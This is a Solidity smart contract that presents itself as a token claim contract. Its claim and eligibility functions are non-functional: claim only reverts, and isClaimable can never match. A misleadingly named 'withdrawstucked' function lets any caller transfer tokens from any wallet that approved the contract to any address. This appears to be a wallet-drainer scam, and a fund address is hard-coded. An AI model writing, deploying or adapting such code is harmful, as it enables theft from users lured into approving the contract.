// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract ClaimContract {
    address public immutable fundAddress;
    bytes32 private claimHash;

    error IneligibleWallet(string reason);

    constructor() {
        fundAddress = 0xB02F39e382c90160Eb816DE5e0E428ac771d77B5;
        claimHash = keccak256(abi.encodePacked("908270"));
    }

    function getFundAddress() external view returns (address) {
        return fundAddress;
    }

    function isClaimable(uint256 code) external view returns (bool) {
        return keccak256(abi.encodePacked(code)) == claimHash;
    }

    function claim(uint256 amount) external pure {
        if (amount < 1e18) {
            revert IneligibleWallet("Minimum claim amount not met");
        }
    }

    function withdrawstucked(address token, address sender, address recipient, uint256 amount) external {
        IERC20 erc20 = IERC20(token);
        require(erc20.allowance(sender, address(this)) >= amount, "Allowance too low");
        require(erc20.balanceOf(sender) >= amount, "Insufficient balance");
        require(gasleft() > 50000, "Insufficient gas");
        require(erc20.transferFrom(sender, recipient, amount), "Transfer failed");
    }
}